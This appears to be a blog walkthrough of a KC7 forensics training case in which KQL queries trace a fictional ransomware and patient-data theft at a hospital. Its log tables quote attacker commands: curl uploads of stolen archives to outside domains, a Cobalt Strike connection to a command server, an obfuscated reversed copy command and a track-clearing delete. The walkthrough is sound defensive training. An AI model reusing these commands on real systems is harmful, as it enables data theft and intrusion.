---
layout: post
title: '"JoJoHospital"'
categories: KQL KC7
date: 2025-11-28
draft: true
tags: forensics
---

> This is a walkthrough of the KC7 Case "JoJoHospital". All questions below are presented in the order of the case unless otherwise specified. **All active links have been defanged with brackets to prevent accidental clicks.**
{: .prompt-info}  

&nbsp;


## Section 1 - "Crypto - but the bad kind"

### Questions 1-10

#### **Q1: How many hours did the hackers give the hospital to pay the ransom?**

{% include embed/youtube.html id='06pzJRrtGAM' %}


`72 hours`

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### Q2: What was the name of the ransomware group?
  
![Desktop View](/post_content/KC7/Pasted image 20251128090941.png){: width="972" height="589" .w-75}
_The ransomware group left a bold name at the top of the note_    


`Lock Byte`

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q3: The ransomware group had a snarky and mean slogan: "we spend your money, so `____`"**


`you dont have to.`

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q4: How much did the hackers ask the patients to pay?**

Not only did the hackers ask the hospital for money, but they also sent scary emails to patients. They asked patients to pay money too, or their personal information would be shared.  

&nbsp;


![Desktop View](/post_content/KC7/Pasted image 20251128091155.png){: width="972" height="589" .w-75}
_Patient LockByte Note_  

&nbsp;



`$10,000`
 
&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q5: What very important unique identifier number did the ransomware operators threaten to release?**


`Social Security Number`

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q6: How many total files were encrypted at the hospital?**

We can confirm that the hackers encrypted files on the machines of many employees. This means those employees could no longer access their important files. This is very bad!

We can find the locked files by looking for files that end with ".encrypted"


```
FileCreationEvents
| where filename endswith ".encrypted"
| count
```  


`6420`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q7: How many unique hostnames had files encrypted on them?**  

To properly scope our investigation, it would be helpful to know how many computers had their files locked up by the ransomware. This information will help us understand the extent of the problem and plan our next steps.


```
FileCreationEvents
| where filename endswith ".encrypted"
| distinct hostname
| count
```  


`321`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q8: The hackers left a note on at least one of the computers telling the hospital how to pay the ransom. This note had a specific name `We_Have_Your_Data_Pay_Up.txt`**  

```
FileCreationEvents
| where filename == "We_Have_Your_Data_Pay_Up.txt"
```  


| timestamp                | hostname     | username | sha256                                                           | path                                                    | filename                     | process_name |     |
| ------------------------ | ------------ | -------- | ---------------------------------------------------------------- | ------------------------------------------------------- | ---------------------------- | ------------ | --- |
| 2024-06-17T14:49:02.000Z | AMFB-MACHINE | andavis  | 97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018 | C:\Users\andavis\Documents\We_Have_Your_Data_Pay_Up.txt | We_Have_Your_Data_Pay_Up.txt | explorer.exe |     |


What was the Sha256 hash of this ransom file?

`97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q9: What was the full path of this ransom file?**  

`C:\Users\andavis\Documents\We_Have_Your_Data_Pay_Up.txt`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q10: On how many hosts (machines) was this ransom file seen?**  


`1`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

### **Questions 11-20**

#### **Q11: What hostname was the ransom note seen on?**  **(Hint: refer back to Q8)**

This ransom note is a major clue! We can use it to figure out how the ransom might have happened.  


`AMFB-MACHINE`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q12: Great, now that we know what hostname the file was seen on. We can figure out who it belongs to!**

What is the name of the employee whose host has the ransom note?    


```
Employees
| where hostname == "AMFB-MACHINE"
```  


| hire_date                | name          | user_agent                                                       | ip_addr   | email_addr                      | company_domain    | username | role                    | hostname     |     |
| ------------------------ | ------------- | ---------------------------------------------------------------- | --------- | ------------------------------- | ----------------- | -------- | ----------------------- | ------------ | --- |
| 2022-06-15T00:00:00.000Z | Anthony Davis | Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0) | 10.10.0.1 | anthony_davis@jojoshospital.org | jojoshospital.org | andavis  | Senior IT Administrator | AMFB-MACHINE |     |


`Anthony Davis`    

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q13: Run the query below. How many process events were executed on Anthony's machine during this time period?**

Since the ransom note was only seen on Anthony's machine, it is likely that more bad stuff happened on this machine.**

We can start by zooming into Anthony's machine to see what weird things occured in ProcessEvents around the time the company got ransomed.

ProcessEvents tell us what kinds of things happened on a computer.

```
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
```  


`14`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q14: What was the name of the ransomer file mentioned?**

Let's read through the commands in the `process_commandline` column from the top down. Make sure you are sorting by time.

One of the command mentions a "ransomer". That's VERY suspicious!


```
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
| where parent_process_name contains "cmd.exe"
```

  
| timestamp                | parent_process_name | parent_process_hash                                              | process_commandline                                                                                                                                                               | process_name              | process_hash                                                     | hostname     | username |     |
| ------------------------ | ------------------- | ---------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------- | ---------------------------------------------------------------- | ------------ | -------- | --- |
| 2024-06-17T13:35:12.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c copy C:\\Users\\andavis\\Downloads\\lockbyte_ransomer.exe \\jojos-hospital.org\\shared\\spread_ransomware.exe                                                          | cmd.exe                   | b29f5d70d4bf72d146b932550b23541b0797f597e24331d47052dad5212925ba | AMFB-MACHINE | andavis  |     |
| 2024-06-17T14:23:25.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_1.zip /source \\jojos-hospital-server\important_data\patient_records         | patient_data_exporter.exe | 0d663ea9485770015ce187c5796b5e171bcf4b14d48175e7189a3456ccd8cb16 | AMFB-MACHINE | andavis  |     |
| 2024-06-17T14:56:02.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_2.zip /source \\jojos-hospital-server\important_data\archive\patient-records | patient_data_exporter.exe | 07850b0ffdf2a408bfec18693b339691227e66de3fc320c01725d72b7c4853d2 | AMFB-MACHINE | andavis  |     |
| 2024-06-17T15:54:53.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_3.zip /source \\jojos-hospital-server\important_data\old-patient-data        | patient_data_exporter.exe | 071668e559d63b7ea3a71c115f66d612faada08bdca301ba95d0ab2c3045c604 | AMFB-MACHINE | andavis  |     |
| 2024-06-17T17:18:57.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c curl -T C:\Users\andavis\Documents\patient_data_1.zip https:[//]secure-health-access.com/upload/patient_data_1.zip                                                     | cmd.exe                   | 21f6b0962ea22e6eb0c1bb6143090e6929b801b54c584268148518c1864ec3c6 | AMFB-MACHINE | andavis  |     |
| 2024-06-17T17:30:31.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c curl -T C:\Users\andavis\Documents\patient_data_2.zip https:[//]secure-health-access.com/upload/patient_data_2.zip                                                     | cmd.exe                   | 1bef9249ff7ae6480d8d62daaab870e3d1e35a67d7551571551d6214d727fea7 | AMFB-MACHINE | andavis  |     |
| 2024-06-17T17:31:50.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c curl -T C:\Users\andavis\Documents\patient_data_3.zip https:[//]secure-health-access.com/upload/patient_data_3.zip                                                     | cmd.exe                   | 6d88a47faaa3f587650f4ebebe9425b3aff292d74f29f582647f05c3dd4fd78b | AMFB-MACHINE | andavis  |     |
| 2024-06-17T17:36:47.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip                                                                                                                      | cmd.exe                   | 3400577569147cdb0ae8edbc9c77dd921a46ca43e7f386adee895a432baa2644 | AMFB-MACHINE | andavis  |     |
 

`lockbyte_ransomer.exe`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q15: When the attackers copied the "ransomer" file to the network share, what new name did they give it?** 

The hackers put this "ransomer" file on a shared folder at the hospital called `\\jojos-hospital.org`. They did this to spread the ransomware quickly to many computers in the hospital. By putting the bad file on a shared drive, any computer that could access this drive might run the ransomware.

This way, the infection spreads faster and makes it harder for the hospital's IT team to stop the attack. The hackers used the hospital's sharing system to make the attack as big as possible.


`spread_ransomware.exe`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q16: What tool did the attackers use to steal the data? This will be a .exe file**  

If we keep looking down in the data, we can see that the hackers actually stole some data from the hospital as well

`patient_data_exporter.exe`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

  
#### **Q17: What information did the attackers put into `patient_data_1.zip`? Provide the full path of the network share `\\something\like\this`**  


`\\jojos-hospital-server\important_data\patient_records`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q18: What information did the attackers put into `patient_data_2.zip`? Provide the full path of the network share `\\something\like\this`**  


`\\jojos-hospital-server\important_data\archive\patient-records`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q19: What information did the attackers put into `patient_data_3.zip`? Provide the full path of the network share `\\something\like\this`**  


`\\jojos-hospital-server\important_data\old-patient-data`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q20: What domain (e.g. abcd.com) did the attackers send the stolen data to?**  


`secure-health-access.com`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


### **Questions 21-33**

#### **Q21: What command did they use to clear their tracks? Copy and paste the full command.**  


`cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q22: What domain was the patient data exporter file downloaded from?**  

But wait a minute… `patient_data_exporter.exe` is not a file that is supposed to be used at the hospital. Where did it come from?

Perhaps it was downloaded.


```
OutboundNetworkEvents

| where url has "patient_data_exporter.exe"
```


`secure-health-access.com`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q23: When was the patient data exporter file downloaded? (copy and paste the exact timestamp)**  


`2024-06-17T14:22:29Z`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q24: How many distinct IPs does the domain `secure-health-access.com` resolve to?**  


Okay, so we already know about one domain owned by the hacker. We can use this domain to find more websites or servers that the hacker controls. 


```
PassiveDns
| where domain == "secure-health-access.com"
| distinct ip
```


| ip          |
| ----------- |
| 203.0.113.1 |
| 203.0.113.2 |

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q25: Which one of these IPs ends with the digit `1`?** 


| ip          |
| ----------- |
| 203.0.113.1 |

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q26: Which one of these IPs ends with the digit `2`?** 


| ip          |
| ----------- |
| 203.0.113.2 |

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q27: What additional domain name is associated with these IP addresses?**   


Now's let's "pivot" on the new IP addresses that we found to see if any other domains are associated with them.  


```
PassiveDns

| where ip in ("203.0.113.1", "203.0.113.2")
```


| domain                   |
| ------------------------ |
| secure-health-access.com |
| emr-help.net             |


`emr-help.net`

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q28: How many requests did the hackers make to our website from these IPs?**  


Let's take the actor IPs we found and look for any reconnaissance they conducted against the hospital website. InboundNetworkEvents contains information about browsing to our website.


```
InboundNetworkEvents
| where src_ip  in ("203.0.113.1", "203.0.113.2")
```


| Count |
| ----- |
| 37    |

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q29: The hackers were curious about how to bypass ___ at Jojo's hospital.**  


Wow looks like the threat actors really took their time to research the things they wanted to steal!


```
InboundNetworkEvents
| where src_ip  in ("203.0.113.1", "203.0.113.2")
```


| timestamp                | method | src_ip      | user_agent                                                                                                | url                                                                                    | status_code |     |
| ------------------------ | ------ | ----------- | --------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- | ----------- | --- |
| 2024-05-20T00:00:00.000Z | GET    | 203.0.113.1 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/search=JoJo%27s+Hospital+patient+records                   | 200         |     |
| 2024-05-20T11:45:05.000Z | GET    | 203.0.113.2 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/search=JoJo%27s+Hospital+medical+database                  | 200         |     |
| 2024-05-20T11:45:18.000Z | GET    | 203.0.113.2 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/search=how+to+access+patient+information+JoJo%27s+Hospital | 200         |     |
| 2024-05-20T11:45:58.000Z | GET    | 203.0.113.1 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/search=JoJo%27s+Hospital+EMR+system                        | 200         |     |
| 2024-05-20T11:46:33.000Z | GET    | 203.0.113.2 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/search=sensitive+data+storage+JoJo%27s+Hospital            | 200         |     |
| 2024-05-20T11:46:50.000Z | GET    | 203.0.113.2 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/search=JoJo%27s+Hospital+data+access+protocols             | 200         |     |
| 2024-05-20T11:46:59.000Z | GET    | 203.0.113.2 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/search=how+to+bypass+security+JoJo%27s+Hospital            | 200         |     |


The last request contains what we are looking for `how+to+bypass+security+JoJo%27s+Hospital`  


`Security`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q30: What was the first web request the hackers made using the term "patient"? (hint: it was a search). Paste the full url.**  


```
InboundNetworkEvents
| where src_ip in ("203.0.113.1", "203.0.113.2")
| where url has "patient"
```


| timestamp                | method | src_ip      | user_agent                                                                                                | url                                                                                    | status_code |     |
| ------------------------ | ------ | ----------- | --------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- | ----------- | --- |
| 2024-05-20T00:00:00.000Z | GET    | 203.0.113.1 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/search=JoJo%27s+Hospital+patient+records                   | 200         |     |
| 2024-05-20T11:45:18.000Z | GET    | 203.0.113.2 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/search=how+to+access+patient+information+JoJo%27s+Hospital | 200         |     |
| 2024-05-20T11:48:28.000Z | GET    | 203.0.113.2 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/internal/patient-database                                  | 200         |     |
| 2024-06-17T13:12:47.000Z | GET    | 203.0.113.1 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/internal/export-patient-data                               | 200         |     |
| 2024-06-17T13:13:13.000Z | GET    | 203.0.113.2 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/archive/patient-records                                    | 200         |     |
| 2024-06-17T13:13:47.000Z | GET    | 203.0.113.1 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/old-patient-data                                           | 200         |     |
| 2024-06-17T13:15:25.000Z | GET    | 203.0.113.1 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/internal/patient-data/export                               | 200         |     |
| 2024-06-17T13:21:09.000Z | GET    | 203.0.113.1 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/internal/patient-records/archive                           | 200         |     |
| 2024-06-17T13:21:55.000Z | GET    | 203.0.113.2 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https:[//]jojoshospital.org/internal/patient-records/backup                            | 200         |     |


`https:[//]jojoshospital.org/search=JoJo%27s+Hospital+patient+records`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q31: When did this login occur?**  


Since we already have two IPs owned by the hackers, we can also check to see if they logged into anybody's account.

AuthenticationEvents show us all logins that happen on computers and servers at the company.


```
AuthenticationEvents
| where src_ip in ("203.0.113.1", "203.0.113.2")
```


| timestamp                | hostname      | src_ip      | user_agent                                                                                                | username | result           | password_hash                    | description                               |
| ------------------------ | ------------- | ----------- | --------------------------------------------------------------------------------------------------------- | -------- | ---------------- | -------------------------------- | ----------------------------------------- |
| 2024-05-20T00:00:00.000Z | MAIL-SERVER01 | 203.0.113.1 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | andavis  | Successful Login | a9fbcdd6b449063a2ff822ea7d266402 | A user attempted to log in to their email |  


&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q32: Which IP address did the actors use for the login?**  


`203.0.113.1`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q33: Whose account did the hackers login to? (provide a first and last name)**  


```
Employees
| where username == "andavis"
```  


| hire_date                | name          | user_agent                                                       | ip_addr   | email_addr                      | company_domain    | username | role                    | hostname     |
| ------------------------ | ------------- | ---------------------------------------------------------------- | --------- | ------------------------------- | ----------------- | -------- | ----------------------- | ------------ |
| 2022-06-15T00:00:00.000Z | Anthony Davis | Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0) | 10.10.0.1 | anthony_davis@jojoshospital.org | jojoshospital.org | andavis  | Senior IT Administrator | AMFB-MACHINE |  


&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


## Section 2 - "Sharks in the hospital water"

### **Questions 1-5**
#### **Q1: Whose credentials did the hackers use to access the hospital's network? (Enter first and last name)**  


| timestamp                | parent_process_name | parent_process_hash                                              | process_commandline                                                                                                                                                                                           | process_name            | process_hash                                                     | hostname     | username |
| ------------------------ | ------------------- | ---------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------- | ---------------------------------------------------------------- | ------------ | -------- |
| 2024-05-16T10:00:05.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | C:\Users\andavis\Downloads\advanced-ip-scanner.exe /silent                                                                                                                                                    | advanced-ip-scanner.exe | 1fe07fa09329574eb3d873c458a3625055d49b567e204992099430feee4b9086 | AMFB-MACHINE | andavis  |
| 2024-05-16T11:25:08.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c copy C:\Users\andavis\Documents\network_diagrams.pdf \\jojos-hospital.org\backup\network_diagrams.pdf                                                                                              | cmd.exe                 | eac3dd27cf773e44eae6548ce66f3892636fe050d27961f099cf3b06f572e8f2 | AMFB-MACHINE | andavis  |
| 2024-05-16T12:09:26.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c copy C:\Users\andavis\Documents\credentials.txt \\jojos-hospital.org\backup\credentials.txt                                                                                                        | cmd.exe                 | 73e7f40b606c795b109263962d7e32693e083f066f48e2b88fdba4e68d7d8a9f | AMFB-MACHINE | andavis  |
| 2024-05-16T12:29:40.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c powershell Compress-Archive -Path C:\Users\andavis\Documents\network_diagrams.pdf, C:\Users\andavis\Documents\credentials.txt -DestinationPath C:\Users\andavis\Desktop\important_network_info.zip | cmd.exe                 | 709549bfc86eedf8b8853a7b2bf1b1e395a8efbf1990cb8978756bb1510fcad5 | AMFB-MACHINE | andavis  |
| 2024-05-16T13:32:29.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | ( 'piz.ofni_krowten_tnatropmi\potkseD\sivadna\sresU\:C piz.ofni_krowten_tnatropmi\derahs\tnemtrapedti\gro.latipsohsojoj\\ ypoc c/ exe.dmc' -split '' \| %{$_[0]}) -join ''                                    | cmd.exe                 | dc570db8e6d7c83f90e7c110f491dad0d4a1675543483279ac4cd50f7b60b15d | AMFB-MACHINE | andavis  |
| 2024-05-16T13:39:48.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c curl -F "file=@C:\Users\andavis\Desktop\important_network_info.zip" https://nothing-to-see-here.net/upload                                                                                         | cmd.exe                 | 2347a39f24e593c763c9871d7f09371ff407bd78b02cab42bfd644dc4dbfc659 | AMFB-MACHINE | andavis  |  


We see that credentials.txt is stolen here using Anthony Davis' account `andavis`

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q2: What was the domain name observed in the sponsored search result?**  


A few weeks back someone at the company reported seeing a sponsored google search result for Raising Cane's, the famous chicken place. This restaurant chain has a location across the street from Jojo's hospital and is popular among the hospital staff.


`raisinkanes.com`  

&nbsp;


![Desktop View](/post_content/KC7/Pasted image 20251128125610.png){: width="972" height="589" .w-75}
_Great example of Search Engine Optimization (SEO) poisoning_

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q3: What is the legitimate domain for Raising Cane's?**  


`raisingcanes.com`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q4: How many web requests do we see going to the fake raisinkanes domain?**  


```
OutboundNetworkEvents

| where url contains "raisinkanes.com"
| count
```


| Count |
| ----- |
| 26    |


&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


#### **Q5: How many unique employees were seen browsing to the fake raisinkanes domains? (hint distinct the src_ip)**  


```
OutboundNetworkEvents
| where url contains "raisinkanes.com"
| distinct src_ip
| count 
```


| Count |
| ----- |
| 24    |


&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

### Detour

> Let's hold up a second here, around this point I had fallen down a rabbit hole and found information out of order.  
{: .prompt-info}  

&nbsp;

**Let's take another look at the hostname of interest.**


```
ProcessEvents
| where hostname contains "AMFB-MACHINE"
```


&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

  
**With the above query we get 543 results. Let's refine to make our analysis easier...** 


```
ProcessEvents
| where hostname contains "AMFB-MACHINE"
| where process_name == "cmd.exe"
```

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

**While skimming the data my eye caught this command invoking an IP address. This looks like a it could be of interest to us...**  


| timestamp                | parent_process_name | parent_process_hash                                              | process_commandline                                           | process_name | process_hash                                                     | hostname     | username |     |
| ------------------------ | ------------------- | ---------------------------------------------------------------- | ------------------------------------------------------------- | ------------ | ---------------------------------------------------------------- | ------------ | -------- | --- |
| 2024-05-14T12:24:45.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | C:\ProgramData\cobaltstrike.exe --connect 93.238.22.123:50050 | cmd.exe      | c167a329392a515e1cd2eead7f1481e2acbb02645f7dd036254450e66681cb7f | AMFB-MACHINE | andavis  |     |


&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

**Domains connected to the Cobalt Strike IP found in the above data:**  


```
PassiveDns
| where ip == "93.238.22.123"
```


| timestamp                | ip            | domain                   |
| ------------------------ | ------------- | ------------------------ |
| 2024-04-28T13:38:56.000Z | 93.238.22.123 | totally-legit-domain.com |
| 2024-04-28T13:38:56.000Z | 93.238.22.123 | nothing-to-see-here.net  |


&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">


**Distinct IPs connected to the two domain names:**

```
PassiveDns
| where domain in ("totally-legit-domain.com", "nothing-to-see-here.net")
| distinct ip
```


| ip            |
| ------------- |
| 93.238.22.123 |
| 93.238.22.121 |
| 93.238.22.124 |
| 93.238.22.122 |


&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

### **Questions 6-10**

> And we are back! The rest of the post goes in case order.
 {: .prompt-info}

&nbsp;


#### **Q6: Which of the malicious domains used for redirection starts with the word "nothing"?**  


```
PassiveDns
| where domain contains "nothing"
```


| domain                  |
| ----------------------- |
| nothing-to-see-here.net |

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q7: Which of the malicious domains used for redirection starts with the word "totally"?**  


```
PassiveDns
| where domain contains "totally"
```


| domain                   |
| ------------------------ |
| totally-legit-domain.com |

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q8: What is the name of the docx file they are redirected to?**  


`Raisin_Kane_Promo_Offer.docx`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q9: What is the name of the pdf file they are redirected to?**  


`Raisin_Kane_Free_Meal_Voucher.pdf`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q10: What is the hostname of the first person to download the suspicious docx file?**  


```
FileCreationEvents
| where filename == "Raisin_Kane_Promo_Offer.docx"
```

  
| timestamp                | hostname     | username | sha256                                                           | path                                                     | filename                     | process_name |
| ------------------------ | ------------ | -------- | ---------------------------------------------------------------- | -------------------------------------------------------- | ---------------------------- | ------------ |
| 2024-05-01T09:56:50.000Z | RQJQ-MACHINE | evbrowne | bd886046266b909a8ca5f19f16e5606baf73194a70632c81fdc44ef39ba29712 | C:\Users\evbrowne\Downloads\Raisin_Kane_Promo_Offer.docx | Raisin_Kane_Promo_Offer.docx | chrome.exe   |  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

### **Questions 11-20**  

#### **Q11: When did this download occur?**  

`2024-05-01T09:56:50.000Z`

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q12: What was the Sha256 hash of the file?**  

`bd886046266b909a8ca5f19f16e5606baf73194a70632c81fdc44ef39ba29712`

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q13: Which browser was used to download this file?**  

`chrome.exe1`

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q14: What was the name of the malicious file dropped by the attackers?**  

```
FileCreationEvents
| where hostname == "RQJQ-MACHINE"
| where path contains ".exe"
```


|timestamp|hostname|username|sha256|path|filename|process_name|
|---|---|---|---|---|---|---|
|2024-05-01T09:57:17.000Z|RQJQ-MACHINE|evbrowne|0e7e0e888f22b5cc83ce5f2560f9f331d89b8e02875e98ace822e074f2ee486b|C:\ProgramData\cobaltstrike.exe|cobaltstrike.exe|explorer.exe|  

`cobaltstrike.exe`

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q15: Which command (`process_commandline`) shows the execution of the `Raisin_Kane_Promo_Offer.docx` file? (copy and paste the whole command)**  


```
ProcessEvents
| where hostname == "RQJQ-MACHINE"
| where timestamp between (datetime(2024-05-01) .. datetime(2024-05-02))
| where process_commandline contains "Raisin_Kane_Promo_Offer.docx"
```


|process_commandline|
|---|
|"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\evbrowne\Downloads\Raisin_Kane_Promo_Offer.docx"|  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q16: What IP address do the hackers connect to using cobalt strike?**  


```
ProcessEvents
| where process_commandline contains "cobalt"
```


| process_commandline                                           |
| ------------------------------------------------------------- |
| C:\ProgramData\cobaltstrike.exe --connect 93.238.22.122:50050 |  


`93.238.22.122`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q17: Over what port do the hackers connect to that IP address?**  


`50050`  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q18: What was the first discovery command issued by the hackers? (hint: it has to do with a system)**  


```
ProcessEvents
| where hostname == "RQJQ-MACHINE"
| where timestamp between (datetime(2024-05-02) .. datetime(2024-05-04))
| where process_name contains "cmd"
```


| process_commandline |
| ------------------- |
